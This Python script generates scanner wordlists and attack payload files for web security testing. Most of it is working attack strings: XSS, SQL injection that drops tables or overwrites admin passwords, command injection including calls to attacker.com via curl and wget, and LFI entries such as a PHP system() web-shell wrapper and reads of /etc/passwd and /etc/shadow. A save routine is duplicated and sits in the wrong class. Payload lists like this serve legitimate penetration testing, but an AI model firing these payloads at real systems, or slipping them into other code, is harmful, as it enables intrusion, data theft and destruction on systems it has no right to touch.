#!/usr/bin/env python3
"""
Enhanced Wordlist and Payload Generator
Generates comprehensive wordlists and payloads for advanced security testing
"""

import json
import os
from pathlib import Path
from typing import Dict, List, Any
import urllib.parse
import base64

# Get project paths
HERE = Path(__file__).parent
WORDLISTS_DIR = HERE / "wordlists_extra"
PAYLOADS_DIR = HERE / "payloads"

class EnhancedWordlistGenerator:
    """Generate comprehensive wordlists for various scanning purposes"""
    
    def __init__(self):
        self.wordlists_dir = WORDLISTS_DIR
        self.payloads_dir = PAYLOADS_DIR
        
        # Ensure directories exist
        self.wordlists_dir.mkdir(exist_ok=True)
        self.payloads_dir.mkdir(exist_ok=True)
    
    def generate_technology_specific_wordlists(self) -> Dict[str, List[str]]:
        """Generate technology-specific wordlists"""
        tech_wordlists = {
            'php': [
                'index.php', 'admin.php', 'login.php', 'config.php', 'info.php',
                'phpinfo.php', 'test.php', 'wp-config.php', 'wp-admin.php',
                'dashboard.php', 'panel.php', 'control.php', 'setup.php',
                'install.php', 'update.php', 'upgrade.php', 'backup.php',
                'database.php', 'db.php', 'mysql.php', 'phpmyadmin',
                'mail.php', 'contact.php', 'form.php', 'upload.php',
                'file.php', 'download.php', 'search.php', 'api.php',
                'ajax.php', 'cron.php', 'cronjob.php', 'shell.php',
                'webshell.php', 'backdoor.php', 'hack.php', 'exploit.php'
            ],
            'asp': [
                'default.asp', 'index.asp', 'admin.asp', 'login.asp',
                'global.asa', 'web.config', 'machine.config', 'error.asp',
                'debug.asp', 'test.asp', 'upload.asp', 'file.asp',
                'search.asp', 'mail.asp', 'contact.asp', 'form.asp',
                'database.asp', 'db.asp', 'sql.asp', 'access.asp'
            ],
            'aspx': [
                'default.aspx', 'index.aspx', 'admin.aspx', 'login.aspx',
                'web.config', 'global.asax', 'site.master', 'error.aspx',
                'debug.aspx', 'test.aspx', 'upload.aspx', 'file.aspx',
                'search.aspx', 'mail.aspx', 'contact.aspx', 'form.aspx',
                'api.aspx', 'webservice.asmx', 'service.svc'
            ],
            'jsp': [
                'index.jsp', 'admin.jsp', 'login.jsp', 'error.jsp',
                'web.xml', 'context.xml', 'server.xml', 'struts.xml',
                'spring.xml', 'hibernate.cfg.xml', 'log4j.properties',
                'test.jsp', 'debug.jsp', 'upload.jsp', 'search.jsp',
                'api.jsp', 'service.jsp', 'action.jsp', 'bean.jsp'
            ],
            'nodejs': [
                'package.json', 'package-lock.json', 'server.js', 'app.js',
                'index.js', 'main.js', 'config.js', 'routes.js',
                'controller.js', 'model.js', 'middleware.js', 'auth.js',
                'admin.js', 'api.js', 'socket.js', 'cluster.js',
                'worker.js', '.env', '.env.local', '.env.production',
                'ecosystem.config.js', 'pm2.config.js', 'webpack.config.js'
            ],
            'python': [
                'app.py', 'main.py', 'server.py', 'run.py', 'wsgi.py',
                'manage.py', 'settings.py', 'config.py', 'urls.py',
                'views.py', 'models.py', 'admin.py', 'forms.py',
                'requirements.txt', 'setup.py', 'Pipfile', '.env',
                'celery.py', 'tasks.py', 'api.py', 'serializers.py'
            ],
            'ruby': [
                'Gemfile', 'Gemfile.lock', 'config.ru', 'Rakefile',
                'application.rb', 'routes.rb', 'database.yml', 'secrets.yml',
                'application_controller.rb', 'user.rb', 'admin.rb',
                '.env', '.env.local', '.ruby-version', 'unicorn.rb'
            ],
            'java': [
                'web.xml', 'context.xml', 'server.xml', 'application.properties',
                'application.yml', 'pom.xml', 'build.gradle', 'web.xml',
                'spring-boot.jar', 'application.jar', 'ROOT.war',
                'admin.war', 'manager.war', 'host-manager.war'
            ]
        }
        
        return tech_wordlists
    
    def generate_cloud_specific_wordlists(self) -> Dict[str, List[str]]:
        """Generate cloud service specific wordlists"""
        cloud_wordlists = {
            'aws': [
                '.aws', 'aws.json', 'credentials', 'config', 's3',
                'bucket', 'ec2', 'lambda', 'cloudformation', 'terraform',
                'aws-exports.js', 'amplify', 'cognito', 'dynamodb',
                'elasticbeanstalk', 'ecs', 'eks', 'rds', 'redshift'
            ],
            'azure': [
                '.azure', 'azure.json', 'azuredeploy.json', 'parameters.json',
                'arm-template', 'bicep', 'storage', 'webapp', 'function',
                'keyvault', 'cosmosdb', 'sql', 'redis', 'servicebus'
            ],
            'gcp': [
                '.gcp', 'gcloud', 'service-account.json', 'key.json',
                'firebase', 'firestore', 'storage', 'compute', 'kubernetes',
                'app.yaml', 'cron.yaml', 'queue.yaml', 'dispatch.yaml'
            ],
            'docker': [
                'Dockerfile', 'docker-compose.yml', 'docker-compose.yaml',
                '.dockerignore', 'docker-entrypoint.sh', 'entrypoint.sh',
                'supervisord.conf', 'nginx.conf', 'apache2.conf'
            ],
            'kubernetes': [
                'deployment.yaml', 'service.yaml', 'configmap.yaml',
                'secret.yaml', 'ingress.yaml', 'namespace.yaml',
                'pod.yaml', 'replicaset.yaml', 'statefulset.yaml',
                'daemonset.yaml', 'job.yaml', 'cronjob.yaml'
            ]
        }
        
        return cloud_wordlists
    
    def generate_api_wordlists(self) -> List[str]:
        """Generate API-specific paths and endpoints"""
        api_paths = [
            # REST API patterns
            'api', 'api/v1', 'api/v2', 'api/v3', 'apis', 'rest',
            'graphql', 'gql', 'ws', 'websocket', 'socket',
            
            # Common endpoints
            'api/users', 'api/user', 'api/login', 'api/auth',
            'api/admin', 'api/config', 'api/status', 'api/health',
            'api/metrics', 'api/debug', 'api/test', 'api/docs',
            'api/swagger', 'api/openapi', 'api/schema',
            
            # CRUD operations
            'api/create', 'api/read', 'api/update', 'api/delete',
            'api/list', 'api/get', 'api/post', 'api/put',
            'api/patch', 'api/search', 'api/filter', 'api/query',
            
            # Data formats
            'api/json', 'api/xml', 'api/csv', 'api/pdf',
            'api/export', 'api/import', 'api/backup', 'api/restore',
            
            # Authentication
            'oauth', 'oauth2', 'token', 'jwt', 'saml', 'sso',
            'api/token', 'api/refresh', 'api/logout', 'api/register',
            
            # File operations
            'api/upload', 'api/download', 'api/file', 'api/files',
            'api/image', 'api/images', 'api/media', 'api/static',
            
            # Database operations
            'api/db', 'api/database', 'api/sql', 'api/query',
            'api/transaction', 'api/commit', 'api/rollback',
            
            # System operations
            'api/system', 'api/server', 'api/process', 'api/service',
            'api/restart', 'api/shutdown', 'api/reboot', 'api/logs'
        ]
        
        # Add versioned endpoints
        versions = ['v1', 'v2', 'v3', 'v4', 'v5', '1.0', '2.0', '3.0']
        versioned_paths = []
        for version in versions:
            versioned_paths.extend([f'api/{version}/{path.split("/")[-1]}' for path in api_paths if not path.startswith('api/')])
        
        return api_paths + versioned_paths
    
    def generate_security_wordlists(self) -> Dict[str, List[str]]:
        """Generate security-focused wordlists"""
        security_wordlists = {
            'admin_panels': [
                'admin', 'administrator', 'administration', 'adminpanel',
                'admin-panel', 'admin_panel', 'control', 'controlpanel',
                'cp', 'cpanel', 'dashboard', 'panel', 'manager',
                'management', 'console', 'backend', 'backoffice',
                'operator', 'moderator', 'supervisor', 'root',
                'sysadmin', 'webadmin', 'admins', 'admin-console',
                'admin-interface', 'admin-area', 'admin-zone'
            ],
            'login_pages': [
                'login', 'signin', 'log-in', 'sign-in', 'logon',
                'log-on', 'auth', 'authenticate', 'authorization',
                'session', 'access', 'enter', 'portal', 'gateway',
                'secure', 'private', 'restricted', 'members',
                'users', 'user', 'account', 'accounts', 'profile'
            ],
            'config_files': [
                'config', 'configuration', 'settings', 'options',
                'preferences', 'conf', 'cfg', 'ini', 'properties',
                'yaml', 'yml', 'json', 'xml', 'toml', 'env',
                '.env', '.env.local', '.env.production', '.env.development',
                'web.config', 'app.config', 'machine.config',
                'httpd.conf', 'apache.conf', 'nginx.conf'
            ],
            'backup_files': [
                'backup', 'backups', 'bak', 'old', 'copy', 'orig',
                'original', 'save', 'saved', 'archive', 'archives',
                'temp', 'tmp', 'cache', 'log', 'logs', 'history',
                'dump', 'dumps', 'export', 'exports', 'data'
            ],
            'test_files': [
                'test', 'tests', 'testing', 'debug', 'dev',
                'development', 'staging', 'demo', 'sample',
                'example', 'temp', 'temporary', 'trial',
                'beta', 'alpha', 'prototype', 'poc', 'proof'
            ]
        }
        
        return security_wordlists

class EnhancedPayloadGenerator:
    """Generate comprehensive payloads for vulnerability testing"""
    
    def __init__(self):
        self.payloads_dir = PAYLOADS_DIR
        self.payloads_dir.mkdir(exist_ok=True)
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate comprehensive XSS payloads"""
        xss_payloads = [
            # Basic XSS
            '<script>alert("XSS")</script>',
            '<script>alert(1)</script>',
            '<script>confirm("XSS")</script>',
            '<script>prompt("XSS")</script>',
            
            # Event handlers
            '<img src=x onerror=alert("XSS")>',
            '<img src=x onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video onloadstart=alert("XSS")><source>',
            '<audio onloadstart=alert("XSS")><source>',
            
            # JavaScript URLs
            'javascript:alert("XSS")',
            'javascript:confirm("XSS")',
            'javascript:prompt("XSS")',
            
            # Data URLs
            'data:text/html,<script>alert("XSS")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            
            # Filter bypasses
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
            '<script>setTimeout("alert(\'XSS\')",1)</script>',
            '<script>setInterval("alert(\'XSS\')",1)</script>',
            
            # Encoding bypasses
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
            
            # CSS injection
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<style>@import"javascript:alert(\'XSS\')"</style>',
            '<style>body{-moz-binding:url("javascript:alert(\'XSS\')")}</style>',
            
            # SVG payloads
            '<svg onload=alert("XSS")>',
            '<svg><script>alert("XSS")</script></svg>',
            '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
            
            # DOM-based
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<object data="javascript:alert(\'XSS\')"></object>',
            '<embed src="javascript:alert(\'XSS\')"></embed>',
            
            # Modern bypasses
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<meter onmouseenter=alert("XSS")>',
            '<progress onmouseenter=alert("XSS")>',
        ]
        
        return xss_payloads
    
    def generate_sqli_payloads(self) -> List[str]:
        """Generate comprehensive SQL injection payloads"""
        sqli_payloads = [
            # Basic injection
            "'", "''", '"', '""', "1'", '1"',
            "1' OR '1'='1", '1" OR "1"="1',
            "admin'--", 'admin"--', "admin'#", 'admin"#',
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            
            # Boolean-based
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND (SELECT SUBSTRING(user(),1,1))='r'--",
            "1' AND ASCII(SUBSTRING(user(),1,1))=114--",
            
            # Time-based
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
            "1'; SELECT pg_sleep(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            
            # Error-based
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQL injection
            "{'$ne': ''}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "admin'; return true; var x='",
            
            # Second-order
            "admin'; INSERT INTO users VALUES('hacker','password')--",
            "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "admin'; DROP TABLE users--",
            
            # Blind injection
            "1' AND LENGTH(user())=5--",
            "1' AND SUBSTR(user(),1,1)='r'--",
            "1' AND ORD(SUBSTR(user(),1,1))=114--",
            
            # WAF bypasses
            "1'/**/OR/**/1=1--",
            "1'%20OR%201=1--",
            "1'/*!50000OR*/1=1--",
            "1'%0aOR%0a1=1--",
            "1'||'1'='1",
            
            # Database-specific
            # MySQL
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--",
            # PostgreSQL
            "1'; SELECT version()--",
            # MSSQL
            "1'; EXEC xp_cmdshell('whoami')--",
            # Oracle
            "1' AND (SELECT user FROM dual)='SCOTT'--",
        ]
        
        return sqli_payloads
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        cmd_payloads = [
            # Basic command injection
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "${whoami}",
            
            # Directory traversal
            "; ls",
            "| ls",
            "; dir",
            "| dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            # Network commands
            "; ping -c 1 google.com",
            "| ping -c 1 google.com",
            "; nslookup google.com",
            "| nslookup google.com",
            "; curl http://attacker.com",
            "| wget http://attacker.com",
            
            # System information
            "; uname -a",
            "| uname -a",
            "; systeminfo",
            "| systeminfo",
            "; env",
            "| env",
            "; set",
            "| set",
            
            # Time-based detection
            "; sleep 5",
            "| sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            
            # Encoded payloads
            urllib.parse.quote("; whoami"),
            urllib.parse.quote("| whoami"),
            base64.b64encode(b"; whoami").decode(),
            
            # PowerShell
            "; powershell.exe -Command whoami",
            "| powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA",
        ]
        
        return cmd_payloads
    
    def generate_lfi_payloads(self) -> List[str]:
        """Generate Local File Inclusion payloads"""
        lfi_payloads = [
            # Basic LFI
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            
            # Windows
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\windows\\win.ini",
            
            # Null byte injection
            "../etc/passwd%00",
            "../etc/passwd%00.txt",
            "../etc/passwd\x00",
            
            # URL encoding
            "%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "%2e%2e/%65%74%63/%70%61%73%73%77%64",
            "..%2f..%2f..%2fetc%2fpasswd",
            
            # Double encoding
            "%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64",
            
            # PHP wrappers
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            
            # Log poisoning
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/proc/self/environ",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            
            # Common files
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/proc/version",
            "/proc/cmdline",
            "/proc/meminfo",
            "/proc/cpuinfo",
        ]
        
        return lfi_payloads
    
    def save_all_wordlists_and_payloads(self):
        """Save all generated wordlists and payloads to files"""
        print("🔧 Generating enhanced wordlists and payloads...")
        
        # Initialize the payload generator
        payload_generator = EnhancedPayloadGenerator()
        
        # Technology-specific wordlists
        tech_wordlists = self.generate_technology_specific_wordlists()
        for tech, wordlist in tech_wordlists.items():
            file_path = self.wordlists_dir / f"technology_{tech}.txt"
            with open(file_path, 'w') as f:
                f.write('\n'.join(wordlist))
            print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
        
        # Cloud-specific wordlists
        cloud_wordlists = self.generate_cloud_specific_wordlists()
        for cloud, wordlist in cloud_wordlists.items():
            file_path = self.wordlists_dir / f"cloud_{cloud}.txt"
            with open(file_path, 'w') as f:
                f.write('\n'.join(wordlist))
            print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
        
        # API wordlists
        api_wordlist = self.generate_api_wordlists()
        api_file = self.wordlists_dir / "api_endpoints.txt"
        with open(api_file, 'w') as f:
            f.write('\n'.join(api_wordlist))
        print(f"✅ Created: {api_file} ({len(api_wordlist)} entries)")
        
        # Security wordlists
        security_wordlists = self.generate_security_wordlists()
        for category, wordlist in security_wordlists.items():
            file_path = self.wordlists_dir / f"security_{category}.txt"
            with open(file_path, 'w') as f:
                f.write('\n'.join(wordlist))
            print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
        
        # XSS payloads
        xss_payloads = payload_generator.generate_xss_payloads()
        xss_file = self.payloads_dir / "xss_payloads.txt"
        with open(xss_file, 'w') as f:
            f.write('\n'.join(xss_payloads))
        print(f"✅ Created: {xss_file} ({len(xss_payloads)} entries)")
        
        # SQL injection payloads
        sqli_payloads = payload_generator.generate_sqli_payloads()
        sqli_file = self.payloads_dir / "sqli_payloads.txt"
        with open(sqli_file, 'w') as f:
            f.write('\n'.join(sqli_payloads))
        print(f"✅ Created: {sqli_file} ({len(sqli_payloads)} entries)")
        
        # Command injection payloads
        cmd_payloads = payload_generator.generate_command_injection_payloads()
        cmd_file = self.payloads_dir / "command_injection_payloads.txt"
        with open(cmd_file, 'w') as f:
            f.write('\n'.join(cmd_payloads))
        print(f"✅ Created: {cmd_file} ({len(cmd_payloads)} entries)")
        
        # LFI payloads
        lfi_payloads = payload_generator.generate_lfi_payloads()
        lfi_file = self.payloads_dir / "lfi_payloads.txt"
        with open(lfi_file, 'w') as f:
            f.write('\n'.join(lfi_payloads))
        print(f"✅ Created: {lfi_file} ({len(lfi_payloads)} entries)")
        
        # Comprehensive payloads JSON
        all_payloads = {
            "xss": xss_payloads,
            "sqli": sqli_payloads,
            "command_injection": cmd_payloads,
            "lfi": lfi_payloads,
            "technology_wordlists": tech_wordlists,
            "cloud_wordlists": cloud_wordlists,
            "api_endpoints": api_wordlist,
            "security_wordlists": security_wordlists
        }
        
        comprehensive_file = self.payloads_dir / "comprehensive_payloads.json"
        with open(comprehensive_file, 'w') as f:
            json.dump(all_payloads, f, indent=2)
        print(f"✅ Created: {comprehensive_file}")
        
        print(f"\n🎯 Enhanced wordlists and payloads generation complete!")
        print(f"📊 Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}")


def save_all_wordlists_and_payloads():
    """Save all generated wordlists and payloads to files"""
    print("🔧 Generating enhanced wordlists and payloads...")
    
    # Initialize generators
    wordlist_generator = EnhancedWordlistGenerator()
    payload_generator = EnhancedPayloadGenerator()
    
    # Technology-specific wordlists
    tech_wordlists = wordlist_generator.generate_technology_specific_wordlists()
    for tech, wordlist in tech_wordlists.items():
        file_path = wordlist_generator.wordlists_dir / f"technology_{tech}.txt"
        with open(file_path, 'w') as f:
            f.write('\n'.join(wordlist))
        print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
    
    # Cloud-specific wordlists
    cloud_wordlists = wordlist_generator.generate_cloud_specific_wordlists()
    for cloud, wordlist in cloud_wordlists.items():
        file_path = wordlist_generator.wordlists_dir / f"cloud_{cloud}.txt"
        with open(file_path, 'w') as f:
            f.write('\n'.join(wordlist))
        print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
    
    # API wordlists
    api_wordlist = wordlist_generator.generate_api_wordlists()
    api_file = wordlist_generator.wordlists_dir / "api_endpoints.txt"
    with open(api_file, 'w') as f:
        f.write('\n'.join(api_wordlist))
    print(f"✅ Created: {api_file} ({len(api_wordlist)} entries)")
    
    # Security wordlists
    security_wordlists = wordlist_generator.generate_security_wordlists()
    for category, wordlist in security_wordlists.items():
        file_path = wordlist_generator.wordlists_dir / f"security_{category}.txt"
        with open(file_path, 'w') as f:
            f.write('\n'.join(wordlist))
        print(f"✅ Created: {file_path} ({len(wordlist)} entries)")
    
    # XSS payloads
    xss_payloads = payload_generator.generate_xss_payloads()
    xss_file = payload_generator.payloads_dir / "xss_payloads.txt"
    with open(xss_file, 'w') as f:
        f.write('\n'.join(xss_payloads))
    print(f"✅ Created: {xss_file} ({len(xss_payloads)} entries)")
    
    # SQL injection payloads
    sqli_payloads = payload_generator.generate_sqli_payloads()
    sqli_file = payload_generator.payloads_dir / "sqli_payloads.txt"
    with open(sqli_file, 'w') as f:
        f.write('\n'.join(sqli_payloads))
    print(f"✅ Created: {sqli_file} ({len(sqli_payloads)} entries)")
    
    # Command injection payloads
    cmd_payloads = payload_generator.generate_command_injection_payloads()
    cmd_file = payload_generator.payloads_dir / "command_injection_payloads.txt"
    with open(cmd_file, 'w') as f:
        f.write('\n'.join(cmd_payloads))
    print(f"✅ Created: {cmd_file} ({len(cmd_payloads)} entries)")
    
    # LFI payloads
    lfi_payloads = payload_generator.generate_lfi_payloads()
    lfi_file = payload_generator.payloads_dir / "lfi_payloads.txt"
    with open(lfi_file, 'w') as f:
        f.write('\n'.join(lfi_payloads))
    print(f"✅ Created: {lfi_file} ({len(lfi_payloads)} entries)")
    
    # Comprehensive payloads JSON
    all_payloads = {
        "xss": xss_payloads,
        "sqli": sqli_payloads,
        "command_injection": cmd_payloads,
        "lfi": lfi_payloads,
        "technology_wordlists": tech_wordlists,
        "cloud_wordlists": cloud_wordlists,
        "api_endpoints": api_wordlist,
        "security_wordlists": security_wordlists
    }
    
    comprehensive_file = payload_generator.payloads_dir / "comprehensive_payloads.json"
    with open(comprehensive_file, 'w') as f:
        json.dump(all_payloads, f, indent=2)
    print(f"✅ Created: {comprehensive_file}")
    
    print(f"\n🎯 Enhanced wordlists and payloads generation complete!")
    print(f"📊 Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}")


def main():
    """Main function to generate all wordlists and payloads"""
    save_all_wordlists_and_payloads()

if __name__ == "__main__":
    main()